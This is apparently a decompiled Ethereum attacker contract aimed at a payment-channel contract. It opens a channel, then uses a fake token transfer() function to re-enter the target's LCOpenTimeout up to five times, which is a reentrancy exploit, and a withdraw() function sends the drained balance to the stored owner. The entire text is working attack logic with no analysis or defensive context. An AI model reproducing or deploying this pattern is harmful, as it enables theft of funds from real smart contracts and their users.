contract main {




// =====================  Runtime code  =====================


const transferFrom(address arg1, address arg2, uint256 arg3) = 1

const getBalace = eth.balance(this.address)


address stor0;
address stor1;
uint256 stor2;
uint256 stor3;

function _fallback() payable {
  stop
}

function attack() {
    require ext_code.size(stor1)
    call stor1.LCOpenTimeout(bytes32 arg1) with:
         gas gas_remaining wei
        args stor3
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function withdraw() {
    require msg.sender == stor0
    call stor0 with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function transfer(address arg1, uint256 arg2) {
    if stor2 < 5:
        stor2++
        require ext_code.size(stor1)
        call stor1.LCOpenTimeout(bytes32 arg1) with:
             gas gas_remaining wei
            args stor3
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
    return 1
}

function openChannel() payable {
    require ext_code.size(stor1)
    call stor1.createChannel(bytes32 arg1, address arg2, uint256 arg3, address arg4, uint256[2] arg5) with:
       value msg.value wei
         gas gas_remaining wei
        args stor3, address(this.address), 0, address(this.address), msg.value, 100
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
